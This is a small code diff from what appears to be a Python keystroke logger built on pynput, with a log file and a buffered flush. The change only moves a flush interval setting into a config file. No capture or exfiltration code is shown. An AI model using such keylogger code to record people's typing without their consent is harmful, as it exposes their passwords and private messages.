@@ -2,11 +2,11 @@
 
 from pynput import keyboard
 from config.config import LOG_FILE
+from config.config import FLUSH_INTERVAL
 from datetime import datetime
 import threading
 
 buffer = ""
-flush_interval = 10  # seconds
 
 def format_key(key):
     """Format special keys to be readable"""
